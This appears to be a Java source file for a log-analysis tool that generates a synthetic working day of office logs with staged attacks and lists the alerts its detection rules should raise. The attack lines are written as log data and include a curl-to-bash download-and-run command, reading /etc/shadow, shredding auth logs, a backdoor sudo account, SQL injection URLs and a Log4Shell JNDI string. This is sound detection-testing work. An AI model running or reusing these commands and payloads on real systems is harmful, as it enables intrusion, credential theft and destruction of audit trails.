package io.github.jody2905.logwarden.core.sim;

import java.time.DayOfWeek;
import java.time.Instant;
import java.time.LocalDate;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.Set;

/**
 * Writes a realistic working day of logs for a small office, in the real formats (Linux auth.log, Windows
 * Security events as JSON, nginx access log, UFW firewall log), with attacks hidden in the normal traffic.
 * {@link Day#expected()} lists what a SIEM should find, so the detection rules can be tested end to end.
 *
 * <p>All addresses are private (10.x) or from the ranges reserved for documentation, and all people are invented.
 */
public final class AttackSimulator {

    /** One alert the rules should raise: a rule id and text that should appear in the alert's entity. */
    public record Expected(String ruleId, String entityContains, String story) { }

    public record Day(Map<String, String> logs, List<Expected> expected, LocalDate date) {
        public int lineCount() {
            return logs.values().stream().mapToInt(s -> s.isEmpty() ? 0 : s.split("\n").length).sum();
        }
    }

    private static final DateTimeFormatter SYSLOG = DateTimeFormatter.ofPattern("MMM ppd HH:mm:ss", Locale.ENGLISH);
    private static final DateTimeFormatter WEB = DateTimeFormatter.ofPattern("dd/MMM/yyyy:HH:mm:ss Z", Locale.ENGLISH);

    static final String[] STAFF = {"rsamuel", "kjohn", "tbrowne", "nwilliams", "dcupid", "abaptiste", "jhackshaw", "sprovidence",
            "lthomas", "mmills", "cballantyne", "gdasilva", "pshallow", "oquow", "kbacchus", "wking", "ylewis", "achild", "tstephens", "hjoseph"};
    static final String WIN_ADMIN = "dcharles", LINUX_ADMIN = "mbrowne", DEPLOY = "deploy";
    static final Set<String> BAD = Set.of("203.0.113.66", "203.0.113.67", "198.51.100.77", "203.0.113.200");

    private final ZoneId zone;
    private final Random rnd;
    private final List<Line> linux = new ArrayList<>(), windows = new ArrayList<>(), web = new ArrayList<>(), fw = new ArrayList<>();
    private final List<Expected> expected = new ArrayList<>();
    private int pid = 1200;

    private record Line(Instant t, String text) { }

    public AttackSimulator(ZoneId zone, long seed) {
        this.zone = zone;
        this.rnd = new Random(seed);
    }

    /** A weekday's logs. {@code day} should be a Monday–Friday so working hours make sense. */
    public Day simulate(LocalDate day) {
        if (day.getDayOfWeek() == DayOfWeek.SATURDAY) day = day.minusDays(1);
        if (day.getDayOfWeek() == DayOfWeek.SUNDAY) day = day.minusDays(2);
        background(day);
        attacks(day);
        Map<String, String> logs = new LinkedHashMap<>();
        logs.put("linux", render(linux));
        logs.put("windows", render(windows));
        logs.put("web", render(web));
        logs.put("firewall", render(fw));
        return new Day(logs, List.copyOf(expected), day);
    }

    // ------------------------------------------------------------------ normal activity

    private void background(LocalDate day) {
        // Staff log on to Windows through the day from their office PCs; a few mistype their password first
        for (int i = 0; i < STAFF.length; i++) {
            String u = STAFF[i], pc = "10.10.1." + (20 + i);
            Instant t = at(day, 7, 30).plusSeconds(rnd.nextInt(2 * 3600));
            if (rnd.nextInt(5) == 0) {
                for (int k = 0, n = 1 + rnd.nextInt(2); k < n; k++) win(t.minusSeconds(20L * (n - k)), 4625, Map.of("TargetUserName", u, "IpAddress", pc, "LogonType", "2"));
            }
            win(t, 4624, Map.of("TargetUserName", u, "IpAddress", pc, "LogonType", "2"));
            for (int k = 0; k < 4 + rnd.nextInt(6); k++) {  // file shares, printers
                win(at(day, 9, 0).plusSeconds(rnd.nextInt(8 * 3600)), 4624, Map.of("TargetUserName", u, "IpAddress", pc, "LogonType", "3"));
            }
        }
        // A couple of staff on the VPN from home in Kingstown
        for (String u : List.of("tbrowne", "mmills")) {
            win(at(day, 17, 40).plusSeconds(rnd.nextInt(3600)), 4624, Map.of("TargetUserName", u, "IpAddress", "192.0.2." + (5 + rnd.nextInt(50)), "LogonType", "10"));
        }
        // kjohn logs on from the office in the morning (the impossible-travel story starts from home later)
        // Windows admin works normal hours
        for (int k = 0; k < 3; k++) {
            Instant t = at(day, 8 + k * 3, 15).plusSeconds(rnd.nextInt(1800));
            win(t, 4624, Map.of("TargetUserName", WIN_ADMIN, "IpAddress", "10.10.1.5", "LogonType", "10"));
            win(t.plusSeconds(1), 4672, Map.of("SubjectUserName", WIN_ADMIN));
        }
        // Linux admin: SSH from the office and routine sudo
        String[] routine = {"/usr/bin/systemctl restart nginx", "/usr/bin/apt-get update", "/usr/bin/tail -n 200 /var/log/nginx/error.log",
                "/usr/bin/journalctl -u nginx --since today", "/usr/bin/df -h", "/usr/sbin/ufw status", "/usr/bin/certbot renew"};
        for (String host : List.of("web01", "app01")) {
            Instant t = at(day, 8, 40).plusSeconds(rnd.nextInt(3600));
            ssh(t, host, "Accepted publickey for " + LINUX_ADMIN + " from 10.10.1.6 port " + port() + " ssh2: ED25519 SHA256:k3yF1ng3rpr1nt");
            for (int k = 0; k < 5; k++) sudo(t.plusSeconds(300L + rnd.nextInt(5 * 3600)), host, LINUX_ADMIN, routine[rnd.nextInt(routine.length)]);
        }
        // The deploy account logs in from the CI server
        for (int k = 0; k < 4; k++) {
            ssh(at(day, 10 + k * 2, 5), "app01", "Accepted publickey for " + DEPLOY + " from 10.10.2.15 port " + port() + " ssh2: RSA SHA256:c1k3y");
        }
        // Internet background noise: bots trying SSH a couple of times each
        String[] botUsers = {"root", "admin", "ubuntu", "test", "user", "oracle", "pi", "git"};
        for (int k = 0; k < 120; k++) {
            String ip = publicIp();
            Instant t = at(day, 0, 0).plusSeconds(rnd.nextInt(24 * 3600));
            for (int n = 0, tries = 1 + rnd.nextInt(3); n < tries; n++) {
                String u = botUsers[rnd.nextInt(botUsers.length)];
                if (!u.equals("root")) ssh(t.plusSeconds(n * 3L), "web01", "Invalid user " + u + " from " + ip + " port " + port());
                ssh(t.plusSeconds(n * 3L + 1), "web01", "Failed password for " + (u.equals("root") ? "" : "invalid user ") + u + " from " + ip + " port " + port() + " ssh2");
            }
        }
        // The public website
        String[] pages = {"/", "/services", "/services/passports", "/forms/tax-return.pdf", "/news", "/contact", "/about", "/api/status",
                "/assets/site.css", "/assets/app.js", "/assets/logo.png", "/search?q=vehicle+licence", "/news/budget-2025"};
        String[] agents = {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Safari/604.1",
                "Mozilla/5.0 (Linux; Android 15) Chrome/130.0 Mobile", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) Safari/605.1.15"};
        for (int k = 0; k < 2200; k++) {
            Instant t = at(day, 6, 0).plusSeconds(rnd.nextInt(17 * 3600));
            String p = pages[rnd.nextInt(pages.length)];
            int status = rnd.nextInt(60) == 0 ? 404 : 200;
            if (status == 404) p = List.of("/favicon.ico", "/apple-touch-icon.png", "/news/old-story", "/robots.txt").get(rnd.nextInt(4));
            web(t, visitorIp(), "GET", p, status, agents[rnd.nextInt(agents.length)]);
        }
        // Firewall: the usual drive-by probes, one port each
        int[] probes = {23, 445, 3389, 1433, 5900, 8080, 2323};
        for (int k = 0; k < 150; k++) {
            fwBlock(at(day, 0, 0).plusSeconds(rnd.nextInt(24 * 3600)), publicIp(), "10.10.0.1", probes[rnd.nextInt(probes.length)]);
        }
    }

    // ------------------------------------------------------------------ attacks

    private void attacks(LocalDate day) {
        // 1. SSH brute force on the web server from "Moscow"
        String bf = "203.0.113.10";
        Instant t = at(day, 3, 12);
        String[] guesses = {"root", "admin", "ubuntu", "postgres", "oracle", "test", "support", "www-data"};
        for (int i = 0; i < 40; i++) {
            String u = guesses[i % guesses.length];
            ssh(t.plusSeconds(i * 6L), "web01", "Failed password for " + (u.equals("root") ? "" : "invalid user ") + u + " from " + bf + " port " + port() + " ssh2");
        }
        expect("brute-force", bf, "40 SSH password guesses against web01 in 4 minutes");
        expect("password-spray", bf, "…against 8 different account names");

        // 2. Password spray against Windows accounts from "Lagos"
        String spray = "198.51.100.70";
        t = at(day, 11, 20);
        for (int i = 0; i < 12; i++) {
            win(t.plusSeconds(i * 50L), 4625, Map.of("TargetUserName", STAFF[i], "IpAddress", spray, "LogonType", "10"));
        }
        expect("password-spray", spray, "one password tried against 12 staff accounts over 10 minutes");

        // 3. The full break-in: guess the deploy password, root shell, backdoor admin account, wipe the logs
        String intruder = "198.51.100.140";
        t = at(day, 14, 2);
        for (int i = 0; i < 8; i++) ssh(t.plusSeconds(i * 9L), "app01", "Failed password for " + DEPLOY + " from " + intruder + " port " + port() + " ssh2");
        ssh(t.plusSeconds(80), "app01", "Accepted password for " + DEPLOY + " from " + intruder + " port " + port() + " ssh2");
        sudo(t.plusSeconds(140), "app01", DEPLOY, "/bin/bash");
        sudo(t.plusSeconds(170), "app01", DEPLOY, "/usr/bin/cat /etc/shadow");
        line(linux, t.plusSeconds(200), syslog(t.plusSeconds(200), "app01", "useradd", "new user: name=svc-backup, UID=1005, GID=1005, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1"));
        line(linux, t.plusSeconds(215), syslog(t.plusSeconds(215), "app01", "usermod", "add 'svc-backup' to group 'sudo'"));
        sudo(t.plusSeconds(260), "app01", DEPLOY, "/bin/sh -c curl -s http://198.51.100.141/x.sh | bash");
        sudo(t.plusSeconds(320), "app01", DEPLOY, "/usr/bin/shred -u /var/log/auth.log.1");
        expect("success-after-failures", intruder, "the deploy account's password guessed after 8 tries");
        expect("impossible-travel", DEPLOY, "deploy used from the office CI server, then from São Paulo");
        expect("suspicious-sudo", "opened a root shell", "sudo /bin/bash");
        expect("suspicious-sudo", "password", "read /etc/shadow");
        expect("account-created", "svc-backup", "backdoor account created");
        expect("admin-group-added", "svc-backup", "backdoor account made an admin 15 seconds later");
        expect("suspicious-sudo", "downloaded", "malware downloaded and run");
        expect("audit-log-cleared", "app01", "auth log shredded");

        // 4. Impossible travel: kjohn logs in from home in Kingstown, then "Beijing" 25 minutes later
        t = at(day, 19, 5);
        win(t, 4624, Map.of("TargetUserName", "kjohn", "IpAddress", "192.0.2.21", "LogonType", "10"));
        win(t.plusSeconds(25 * 60), 4624, Map.of("TargetUserName", "kjohn", "IpAddress", "203.0.113.80", "LogonType", "10"));
        expect("impossible-travel", "kjohn", "Kingstown then Beijing 25 minutes apart");

        // 5. Windows admin account used at 02:40 from "Miami", a temp account made a local admin, the log cleared
        t = at(day, 2, 40);
        win(t, 4624, Map.of("TargetUserName", WIN_ADMIN, "IpAddress", "192.0.2.150", "LogonType", "10"));
        win(t.plusSeconds(1), 4672, Map.of("SubjectUserName", WIN_ADMIN));
        win(t.plusSeconds(240), 4732, Map.of("SubjectUserName", WIN_ADMIN, "MemberName", "CN=tempsupport,OU=Contractors,DC=office,DC=local", "TargetUserName", "Administrators"));
        win(t.plusSeconds(600), 1102, Map.of("SubjectUserName", WIN_ADMIN));
        expect("off-hours-admin", WIN_ADMIN, "admin logon at 02:40 from outside the country");
        expect("admin-group-added", "tempsupport", "contractor account added to Administrators");
        expect("audit-log-cleared", WIN_ADMIN, "Security log cleared");

        // 6. Port scan from "Singapore"
        String scanner = "203.0.113.140";
        t = at(day, 9, 47);
        int[] ports = {21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017};
        for (int i = 0; i < ports.length; i++) fwBlock(t.plusSeconds(i * 2L), scanner, "10.10.0.1", ports[i]);
        expect("port-scan", scanner, "26 ports in under a minute");

        // 7. A web scanner from "Frankfurt", which then finds a SQL injection that works
        String webScan = "198.51.100.200";
        t = at(day, 15, 30);
        String[] probes = {"/admin", "/administrator", "/phpmyadmin", "/wp-admin", "/wp-login.php", "/login.php", "/backup.zip", "/db.sql",
                "/old", "/test", "/dev", "/api/v1/users", "/config.php", "/server-info", "/cgi-bin/test.cgi", "/console", "/manager/html"};
        for (int i = 0; i < 45; i++) web(t.plusSeconds(i * 2L), webScan, "GET", probes[i % probes.length], i % 7 == 0 ? 403 : 404, "Mozilla/5.0 (compatible; Nikto/2.5.0)");
        web(t.plusSeconds(100), webScan, "GET", "/.env", 404, "Mozilla/5.0 (compatible; Nikto/2.5.0)");
        web(t.plusSeconds(130), webScan, "GET", "/services?id=1%27%20OR%20%271%27%3D%271", 200, "sqlmap/1.8.4#stable (https://sqlmap.org)");
        web(t.plusSeconds(131), webScan, "GET", "/services?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", 200, "sqlmap/1.8.4#stable (https://sqlmap.org)");
        expect("web-scanner", webScan, "45 not-found pages in 90 seconds");
        expect("web-attack", "SQL injection", "SQL injection that the server answered with 200");
        expect("web-attack", "secret file", "probe for the .env secrets file");

        // 8. A known-bad address browsing the site, and a Log4Shell attempt from another one
        t = at(day, 12, 10);
        web(t, "203.0.113.66", "GET", "/api/status", 200, "python-requests/2.32");
        web(t.plusSeconds(30), "203.0.113.200", "GET", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.200%3A1389%2Fa%7D", 400, "${jndi:ldap://203.0.113.200:1389/a}");
        expect("threat-intel", "203.0.113.66", "known-bad address reached the API");
        expect("threat-intel", "203.0.113.200", "known-bad address");
        expect("web-attack", "Log4Shell", "Log4Shell exploit attempt");
    }

    // ------------------------------------------------------------------ writers

    private void expect(String rule, String entity, String story) {
        expected.add(new Expected(rule, entity, story));
    }

    private Instant at(LocalDate day, int h, int m) {
        return day.atTime(h, m).atZone(zone).toInstant();
    }

    private int port() {
        return 40000 + rnd.nextInt(25000);
    }

    private String publicIp() {
        // Background noise from ranges with no special story attached
        String[] pools = {"192.0.2.64", "198.51.100.0", "198.51.100.192", "203.0.113.128"};
        while (true) {
            String base = pools[rnd.nextInt(pools.length)];
            String[] p = base.split("\\.");
            String ip = p[0] + "." + p[1] + "." + p[2] + "." + (Integer.parseInt(p[3]) + 1 + rnd.nextInt(62));
            if (!BAD.contains(ip) && !ip.equals("203.0.113.140") && !ip.equals("198.51.100.200")) return ip;
        }
    }

    private String visitorIp() {
        // Mostly local visitors, some from the region and the diaspora
        int r = rnd.nextInt(10);
        if (r < 6) return "192.0.2." + (1 + rnd.nextInt(62));
        if (r < 8) return "192.0.2." + (65 + rnd.nextInt(62));
        return "192.0.2." + (129 + rnd.nextInt(120));
    }

    private void ssh(Instant t, String host, String msg) {
        line(linux, t, syslog(t, host, "sshd[" + (pid++) + "]", msg));
    }

    private void sudo(Instant t, String host, String user, String cmd) {
        line(linux, t, syslog(t, host, "sudo", String.format("%8s : TTY=pts/0 ; PWD=/home/%s ; USER=root ; COMMAND=%s", user, user, cmd)));
    }

    private String syslog(Instant t, String host, String prog, String msg) {
        return SYSLOG.format(t.atZone(zone)) + " " + host + " " + prog + (prog.contains("[") ? "" : "[" + (pid++) + "]") + ": " + msg;
    }

    private void win(Instant t, int id, Map<String, String> data) {
        StringBuilder b = new StringBuilder("{\"TimeCreated\":\"").append(t).append("\",\"EventID\":").append(id).append(",\"Computer\":\"DC01.office.local\"");
        data.forEach((k, v) -> b.append(",\"").append(k).append("\":\"").append(v).append('"'));
        line(windows, t, b.append('}').toString());
    }

    private void web(Instant t, String ip, String method, String path, int status, String ua) {
        String time = WEB.format(t.atZone(zone));
        line(web, t, ip + " - - [" + time + "] \"" + method + " " + path + " HTTP/1.1\" " + status + " " + (status == 200 ? 1200 + rnd.nextInt(30000) : 153)
                + " \"-\" \"" + ua + "\"");
    }

    private void fwBlock(Instant t, String src, String dst, int dport) {
        line(fw, t, SYSLOG.format(t.atZone(zone)) + " fw01 kernel: [" + (100000 + rnd.nextInt(900000)) + "." + rnd.nextInt(999999)
                + "] [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5a:01:02 SRC=" + src + " DST=" + dst + " LEN=44 TOS=0x00 PREC=0x00 TTL=" + (40 + rnd.nextInt(20))
                + " ID=" + rnd.nextInt(65535) + " PROTO=TCP SPT=" + port() + " DPT=" + dport + " WINDOW=1024 RES=0x00 SYN URGP=0");
    }

    private void line(List<Line> to, Instant t, String text) {
        to.add(new Line(t, text));
    }

    private static String render(List<Line> lines) {
        lines.sort(Comparator.comparing(Line::t));
        StringBuilder b = new StringBuilder();
        for (Line l : lines) b.append(l.text()).append('\n');
        return b.toString();
    }

    /** Shift a whole day so it ends around {@code now}, for "load the last 24 hours" in the demo. */
    public static LocalDate recentWeekday(Instant now, ZoneId zone) {
        LocalDate d = ZonedDateTime.ofInstant(now, zone).toLocalDate().minusDays(1);
        while (d.getDayOfWeek() == DayOfWeek.SATURDAY || d.getDayOfWeek() == DayOfWeek.SUNDAY) d = d.minusDays(1);
        return d;
    }
}
